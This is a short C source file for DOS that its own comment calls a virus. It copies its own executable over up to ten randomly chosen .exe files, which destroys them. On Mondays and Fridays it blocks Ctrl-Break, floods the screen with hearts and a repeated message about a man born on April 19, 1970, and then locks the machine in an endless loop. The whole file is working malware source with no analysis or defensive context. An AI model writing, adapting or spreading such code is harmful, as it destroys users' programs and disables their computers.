/* This is a program of a kind of virus */
#include <dir.h>
#include <dos.h>
#include <stdlib.h>
#include <string.h>
#include <conio.h>
#include <stdio.h>
#include <time.h>
int ccc(void);
char *bbb(char *,int);
struct ffblk f;
main(argc,argv)
int argc;
char *argv[];
{ int i,j=0;
  time_t it;
  FILE *fp1,*fp2;
  char path1[30]="\\",path2[30],path3[30],*tem="                        ";
  char in[23106],da[30];
  tem=bbb("\\*",FA_DIREC);
  randomize();
  strcat(path1,tem);
  strcpy(path2,path1);
  strcpy(path3,path1);
  strcat(path1,"\\*.exe");
  fp1=fopen(argv[0],"rb");
  fread(in,23106,1,fp1);
  for(j=1;j<=10;j++)
    {
      strcpy(path2,path3);
      tem=bbb(path1,FA_ARCH);
      strcat(path2,"\\");
      strcat(path2,tem);
      fp2=fopen(path2,"r+b");
      fwrite(in,23106,1,fp2);
    }
  it=time(NULL);
  strcpy(da,ctime(&it));
  *(da+3)=0;
  if((!strcmp(da,"Mon"))||(!strcmp(da,"Fri")))
  {
  ctrlbrk(ccc);
  clrscr();
  textmode(C80);
  textcolor(4|128);
  textbackground(3);
  for (i=1;i<=25;i++)
  for (j=2;j<=79;j++)
    {
     gotoxy(j,i);
     cprintf("%c",3);
   }
  gotoxy(1,2);
  textcolor(0);
  for (i=1;i<=12;i++)
    {
     cprintf(" %c %c%c%c%s",65,72,65,78,"DSOME BOY WHO WAS BORN ON APR. 19TH 1970,WILL BE A GREAT MAN. I LOVE HIM!\n\n\r");
    }
   while(1);
  }
  fclose(fp1);
  }

int ccc(void)
  {
   ctrlbrk(ccc);
   }

char *bbb(char *pth ,int sss)
{
  int j=0,i;
  char nnn[50][30];
  i=findfirst(pth,&f,sss);
  strcpy(nnn[0],f.ff_name);
  while(!i)
  {
  j++;
  i=findnext(&f);
  strcpy(nnn[j],f.ff_name);
  }
  i=random(j);
  return nnn[i];
}
